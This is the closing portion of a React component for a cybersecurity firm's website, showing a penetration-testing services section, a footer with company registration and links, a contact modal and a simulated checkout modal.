                      {["OWASP Testing Guide (WSTG) v4.2", "OWASP API Security Top 10 2023", "PTES (Penetration Testing Execution Standard)", "NIST SP 800-115 Technical Guide", "MITRE ATT&CK v14 (Red Team)", "OSSTMM (Open Source Security Testing Methodology)", "CERT-In Guidelines for Penetration Testing"].map(m => (
                        <div key={m} className="flex items-center gap-2 text-[11px] text-slate-400 font-sans">
                          <span className="w-1 h-1 rounded-full bg-pink-400 shrink-0" />{m}
                        </div>
                      ))}
                    </div>
                    <div className="space-y-3">
                      <h3 className="text-xs font-bold text-slate-300">Report Deliverables</h3>
                      {["Executive Summary (risk-rated, board-ready)", "Technical Finding Details with PoC evidence", "CVSSv4-scored vulnerability ratings", "Exploitation impact narratives", "Step-by-step remediation guidance", "Developer-friendly code-level fixes", "MITRE ATT&CK technique mapping", "Re-test within 30 days included", "Attestation letter for compliance/audit purposes"].map(d => (
                        <div key={d} className="flex items-center gap-2 text-[11px] text-slate-400 font-sans">
                          <span className="text-emerald-400 shrink-0">✓</span>{d}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
                <div className="bg-gradient-to-r from-pink-950/30 to-slate-900/60 border border-pink-800/30 rounded-xl p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-1">Get a pentest quote in 24 hours</h3>
                    <p className="text-xs text-slate-400 font-sans">Tell us your scope — we'll send a detailed proposal with timeline, methodology, and fixed-price quote within one business day.</p>
                  </div>
                  <button onClick={() => setShowContactModal(true)} className="shrink-0 px-6 py-2.5 bg-pink-500 hover:bg-pink-400 text-white text-xs font-extrabold rounded-lg uppercase tracking-wider transition-colors">
                    Request Pentest Quote
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* 5. BOTTOM ECOSYSTEM FOOTER BAR */}
      <footer className="relative bg-[#020810] border-t-0 overflow-hidden">
        {/* Top gradient accent border */}
        <div className="h-px w-full bg-gradient-to-r from-transparent via-cyan-500/60 to-transparent" />
        <div className="h-px w-full bg-gradient-to-r from-transparent via-cyan-900/40 to-transparent mb-0" />

        {/* Trust badge strip */}
        <div className="bg-[#050c14] border-b border-slate-800/60 py-3 px-6">
          <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-center gap-x-6 gap-y-2">
            {[
              { label: "ISO/IEC 27001:2022", color: "text-cyan-400" },
              { label: "SOC 2 Type II", color: "text-emerald-400" },
              { label: "GDPR Compliant", color: "text-sky-400" },
              { label: "PCI-DSS v4.0", color: "text-violet-400" },
              { label: "India DPDP Act 2023", color: "text-amber-400" },
              { label: "MITRE ATT&CK Mapped", color: "text-red-400" },
              { label: "OWASP LLM Top 10", color: "text-pink-400" },
            ].map(b => (
              <span key={b.label} className={`text-[10px] font-mono font-semibold ${b.color} flex items-center gap-1.5 opacity-80 hover:opacity-100 transition-opacity`}>
                <span className={`w-1.5 h-1.5 rounded-full ${b.color.replace("text-", "bg-")} opacity-80`} />
                {b.label}
              </span>
            ))}
          </div>
        </div>

        {/* Main footer grid */}
        <div className="max-w-7xl mx-auto px-6 pt-10 pb-8 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8 [&>*]:border-0">

          {/* Brand column */}
          <div className="lg:col-span-2 space-y-4">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-lg bg-gradient-to-br from-cyan-500 to-cyan-700 flex items-center justify-center shadow-lg shadow-cyan-900/50">
                <span className="text-white font-black text-sm">C</span>
              </div>
              <div>
                <div className="text-sm font-bold text-white tracking-wide">CyberDudeBivash<span className="text-cyan-400">®</span></div>
                <div className="text-[9px] text-slate-500 font-mono tracking-widest uppercase">ECOSYSTEM V4 · EST. 2020</div>
              </div>
            </div>
            <p className="text-[12px] text-slate-400 leading-relaxed font-sans max-w-xs">
              Autonomous AI-powered cybersecurity defense platform delivering real-time threat intelligence, managed SOC auditing, and 100+ security tools to enterprise teams globally.
            </p>
            {/* Legal registration */}
            <div className="bg-slate-900/60 border border-slate-800/80 rounded-lg p-3 space-y-1.5">
              <div className="text-[9px] font-bold text-slate-500 uppercase tracking-widest mb-2">Legal Registration</div>
              <div className="text-[11px] text-slate-300 font-mono">CYBERDUDEBIVASH PRIVATE LIMITED</div>
              <div className="flex flex-wrap gap-x-4 gap-y-1">
                <span className="text-[10px] text-slate-500 font-mono">PAN: <span className="text-cyan-400">ARKPN8270G</span></span>
                <span className="text-[10px] text-slate-500 font-mono">GSTIN: <span className="text-cyan-400">21ARKPN8270G1ZP</span></span>
              </div>
              <div className="text-[10px] text-slate-500 font-sans leading-relaxed">
                29, Korai-Sukinda Rd, Ragadi, Jajpur Road, Odisha 755019, India
              </div>
              <a href="tel:+918179881447" className="text-[11px] font-mono text-cyan-400 hover:text-cyan-300 transition-colors flex items-center gap-1.5 pt-0.5">
                <Phone className="w-3 h-3" /> +91 81798 81447
              </a>
              <a href="mailto:bivash@cyberdudebivash.com" className="text-[11px] font-mono text-cyan-400/80 hover:text-cyan-300 transition-colors block">
                bivash@cyberdudebivash.com
              </a>
            </div>
          </div>

          {/* Workspace links */}
          <div className="space-y-3">
            <h4 className="text-[10px] font-bold uppercase tracking-widest text-cyan-500 border-b border-slate-800 pb-2">Workspace</h4>
            <ul className="space-y-2">
              {[
                { label: "Gateway", view: "home" as const },
                { label: "Sentinel APEX™", view: "intel" as const },
                { label: "AI Hub & Audit", view: "ai" as const },
                { label: "ThreatCore™ Tools", view: "tools" as const },
                { label: "Blog & Academy", view: "blog" as const },
                { label: "REST API", view: "api" as const },
              ].map(l => (
                <li key={l.view}>
                  <button onClick={() => setCurrentView(l.view)} className="text-[12px] text-slate-400 hover:text-cyan-400 transition-colors cursor-pointer text-left font-sans flex items-center gap-2 group">
                    <span className="w-1 h-1 rounded-full bg-slate-700 group-hover:bg-cyan-400 transition-colors" />
                    {l.label}
                  </button>
                </li>
              ))}
            </ul>
          </div>

          {/* Live platforms */}
          <div className="space-y-3">
            <h4 className="text-[10px] font-bold uppercase tracking-widest text-emerald-500 border-b border-slate-800 pb-2">Live Platforms</h4>
            <ul className="space-y-2">
              {[
                { label: "Official Gateway", url: "https://www.cyberdudebivash.com" },
                { label: "Sentinel APEX™", url: "https://intel.cyberdudebivash.com" },
                { label: "AI Security Hub", url: "https://cyberdudebivash.in" },
                { label: "ThreatCore™ Tools", url: "https://tools.cyberdudebivash.com" },
                { label: "Research Blog", url: "https://blog.cyberdudebivash.in" },
                { label: "Developer APIs", url: "https://cyberdudebivash.in/api" },
              ].map(l => (
                <li key={l.url}>
                  <a href={l.url} target="_blank" rel="noopener noreferrer" className="text-[12px] text-slate-400 hover:text-emerald-400 transition-colors font-sans flex items-center gap-2 group">
                    <span className="w-1 h-1 rounded-full bg-slate-700 group-hover:bg-emerald-400 transition-colors" />
                    {l.label}
                  </a>
                </li>
              ))}
            </ul>
          </div>

          {/* Enterprise & legal */}
          <div className="space-y-3">
            <h4 className="text-[10px] font-bold uppercase tracking-widest text-violet-400 border-b border-slate-800 pb-2">Enterprise Services</h4>
            <ul className="space-y-2">
              {[
                { label: "Managed SOC-as-a-Service", view: "soc" as const },
                { label: "DPDP Act Compliance Scans", view: "dpdp" as const },
                { label: "OWASP LLM Red Team", view: "owasp" as const },
                { label: "Multi-Tenant MSSP Suite", view: "mssp" as const },
                { label: "vCISO Advisory", view: "vciso" as const },
                { label: "Penetration Testing", view: "pentest" as const },
              ].map(s => (
                <li key={s.label}>
                  <button
                    onClick={() => setCurrentView(s.view)}
                    className="text-left w-full text-[11px] text-slate-400 hover:text-violet-300 font-sans flex items-start gap-2 group transition-colors"
                  >
                    <span className="w-1 h-1 rounded-full bg-violet-500/60 group-hover:bg-violet-400 mt-1.5 shrink-0 transition-colors" />
                    {s.label}
                  </button>
                </li>
              ))}
            </ul>
            <button
              onClick={() => setShowContactModal(true)}
              className="w-full mt-1 py-1.5 bg-violet-950/40 hover:bg-violet-900/40 border border-violet-800/30 hover:border-violet-600/50 text-violet-400 hover:text-violet-300 text-[10px] font-bold uppercase tracking-wider rounded transition-all"
            >
              Request Enterprise Demo →
            </button>
            <div className="pt-2 space-y-1.5">
              <h4 className="text-[10px] font-bold uppercase tracking-widest text-slate-500 border-b border-slate-800/60 pb-2">Legal</h4>
              {[
                { label: "About Us", view: "about" as const },
                { label: "Privacy Policy", view: "privacy" as const },
                { label: "Terms of Service", view: "terms" as const },
                { label: "Copyright & IP", view: "copyright" as const },
              ].map(l => (
                <button key={l.label} onClick={() => setCurrentView(l.view)} className="block text-[11px] text-slate-500 hover:text-cyan-400 transition-colors cursor-pointer text-left font-sans">
                  {l.label}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Social row */}
        <div className="border-t border-slate-800/60 bg-[#030912]">
          <div className="max-w-7xl mx-auto px-6 py-4 flex flex-wrap items-center justify-between gap-4">
            <div className="flex flex-wrap gap-3">
              {[
                { label: "LinkedIn", url: "https://linkedin.com/company/cyberdudebivash", color: "hover:text-sky-400" },
                { label: "X / Twitter", url: "https://twitter.com/CDBSENTINELAPEX", color: "hover:text-slate-200" },
                { label: "Instagram", url: "https://instagram.com/cyberdudebivash_official", color: "hover:text-pink-400" },
                { label: "YouTube", url: "https://youtube.com/@CYBERDUDEBIVASHSentinelAPEX", color: "hover:text-red-400" },
                { label: "Medium", url: "https://medium.com/@cyberdudebivash", color: "hover:text-emerald-400" },
                { label: "GitHub", url: "https://github.com/cyberdudebivash", color: "hover:text-violet-400" },
              ].map(s => (
                <a key={s.label} href={s.url} target="_blank" rel="noopener noreferrer"
                  className={`text-[11px] text-slate-500 ${s.color} transition-colors font-sans`}>
                  {s.label}
                </a>
              ))}
            </div>
            <div className="flex items-center gap-3 text-[10px] text-slate-600 font-mono">
              <span className="flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                Secure Engine v4.1
              </span>
              <span className="text-slate-700">|</span>
              <span>NODE: 103.142.12.98</span>
            </div>
          </div>
        </div>

        {/* Bottom bar */}
        <div className="bg-black border-t border-slate-900">
          <div className="max-w-7xl mx-auto px-6 py-3 flex flex-col sm:flex-row items-center justify-between gap-2 text-center">
            <div className="text-[10px] text-slate-600 font-mono">
              &copy; {new Date().getFullYear()} CyberDudeBivash Private Limited. All rights reserved.
              &nbsp;&bull;&nbsp;TLP:CLEAR unless otherwise marked.
              &nbsp;&bull;&nbsp;Registered in India under Companies Act 2013.
            </div>
            <div className="text-[10px] text-slate-700 font-mono">SESSION: APEX-9922-BIVASH</div>
          </div>
        </div>
      </footer>

      {/* 6. GENERAL REQUEST ENTRY / LEAD MODAL */}
      {showContactModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm">
          <div className="bg-[#0c1117] border border-slate-800 rounded-lg max-w-md w-full overflow-hidden shadow-2xl">
            <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex justify-between items-center">
              <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                <Briefcase className="w-4.5 h-4.5 text-cyan-500" />
                CyberDudeBivash® Enterprise Request
              </h3>
              <button 
                onClick={() => setShowContactModal(false)}
                className="text-slate-500 hover:text-slate-300 font-mono text-sm p-1"
              >
                [X]
              </button>
            </div>

            <div className="p-6">
              {contactSubmitted ? (
                <div className="text-center py-6 space-y-3 animate-fade-in">
                  <CheckCircle2 className="w-12 h-12 text-emerald-500 mx-auto animate-bounce" />
                  <h4 className="text-slate-200 font-bold text-sm">Enterprise Inquiry Transmitted</h4>
                  <p className="text-xs text-slate-400 max-w-xs mx-auto font-sans leading-relaxed">
                    A Sentinel Security Coordinator from CyberDudeBivash® (Odisha, India) will review your payload coordinates and reach back via secured email channels.
                  </p>
                </div>
              ) : (
                <form onSubmit={handleContactSubmit} className="space-y-4">
                  <p className="text-xs text-slate-400 leading-normal font-sans">
                    Submit your organization coordinates below to request managed cloud HSM backups, physical SOC tokens, or India DPDP automation services.
                  </p>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Full Name</label>
                    <input 
                      type="text" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.name}
                      onChange={(e) => setContactForm({...contactForm, name: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Secure Business Email</label>
                    <input 
                      type="email" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.email}
                      onChange={(e) => setContactForm({...contactForm, email: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Company / Agency Name</label>
                    <input 
                      type="text" 
                      required
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                      value={contactForm.company}
                      onChange={(e) => setContactForm({...contactForm, company: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-mono text-slate-500 mb-1">Requirement Overview</label>
                    <textarea 
                      required
                      rows={3}
                      placeholder="E.g. On-premises Sentinel Threat Detection node..."
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500 resize-none font-sans"
                      value={contactForm.message}
                      onChange={(e) => setContactForm({...contactForm, message: e.target.value})}
                    />
                  </div>
                  <button 
                    type="submit"
                    className="w-full bg-cyan-500 hover:bg-cyan-400 text-black py-2.5 rounded font-bold text-xs uppercase tracking-wider mt-2 transition-all cursor-pointer"
                  >
                    Transmit Secured Request
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}

      {/* 7. INTERACTIVE CHECKOUT MODAL (Gumroad simulator) */}
      {checkoutModalOpen && checkingOutProduct && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm">
          <div className="bg-[#0c1117] border border-slate-800 rounded-lg max-w-md w-full overflow-hidden shadow-2xl animate-fade-in">
            <div className="bg-slate-950 px-6 py-4 border-b border-slate-800 flex justify-between items-center">
              <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
                <Download className="w-4 h-4 text-emerald-400" />
                Gumroad Checkout Core
              </h3>
              <button 
                onClick={() => setCheckoutModalOpen(false)}
                className="text-slate-500 hover:text-slate-300 font-mono text-sm p-1"
              >
                [X]
              </button>
            </div>

            <div className="p-6 space-y-4">
              {checkoutSubmitted ? (
                <div className="text-center py-6 space-y-3">
                  <CheckSquare className="w-12 h-12 text-emerald-500 mx-auto animate-bounce" />
                  <h4 className="text-slate-200 font-bold text-sm">Download Ready!</h4>
                  <p className="text-xs text-slate-400 max-w-xs mx-auto leading-relaxed font-sans">
                    Your payment was verified. The package `{checkingOutProduct.title}` has been registered to your profile. Click Download below to save your defense asset.
                  </p>
                  <div className="pt-2">
                    <button 
                      type="button"
                      onClick={() => {
                        setPurchasedProduct(checkingOutProduct.id);
                        setCheckoutModalOpen(false);
                      }}
                      className="bg-emerald-500 hover:bg-emerald-400 text-black font-extrabold text-xs uppercase py-2 px-6 rounded"
                    >
                      Download Asset (.ZIP)
                    </button>
                  </div>
                </div>
              ) : (
                <form onSubmit={handleCheckoutSubmit} className="space-y-4">
                  <div className="bg-slate-950 p-4 rounded border border-slate-900 space-y-1">
                    <span className="text-[9px] font-mono text-slate-500 uppercase">Selected Asset</span>
                    <h4 className="text-xs font-bold text-slate-200">{checkingOutProduct.title}</h4>
                    <div className="text-xs font-bold text-emerald-400 font-mono pt-1">{checkingOutProduct.price}</div>
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] uppercase font-mono text-slate-500">Receipt Email</label>
                    <input 
                      type="email" 
                      required
                      placeholder="you@domain.com"
                      className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="block text-[10px] uppercase font-mono text-slate-500">Secure Payment Channel</label>
                    <div className="grid grid-cols-3 gap-2">
                      <button
                        type="button"
                        onClick={() => setPaymentOption("upi")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "upi" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        UPI / GPay
                      </button>
                      <button
                        type="button"
                        onClick={() => setPaymentOption("card")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "card" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        Card / Net
                      </button>
                      <button
                        type="button"
                        onClick={() => setPaymentOption("crypto")}
                        className={`py-2 rounded text-[10px] font-bold uppercase transition-all ${
                          paymentOption === "crypto" ? "bg-cyan-950 text-cyan-400 border border-cyan-800" : "bg-slate-950 text-slate-500 border border-slate-900"
                        }`}
                      >
                        USDT / Crypto
                      </button>
                    </div>
                  </div>

                  {paymentOption === "upi" && (
                    <div className="bg-slate-950/80 border border-slate-900 rounded p-3 text-center space-y-1.5 font-mono text-[10px]">
                      <div className="text-slate-400">UPI ID: <span className="font-bold text-slate-200">bivash@cyberdudebivash.com</span></div>
                      <div className="text-slate-500">Scan BHIM, PhonePe, Paytm, or GPay QR code at checkout to process instantly.</div>
                    </div>
                  )}

                  <button 
                    type="submit"
                    className="w-full bg-emerald-500 hover:bg-emerald-400 text-black py-2.5 rounded font-extrabold text-xs uppercase tracking-wider transition-all"
                  >
                    Confirm Secure Payment
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}

      <CookieConsent />
    </div>
  );
}
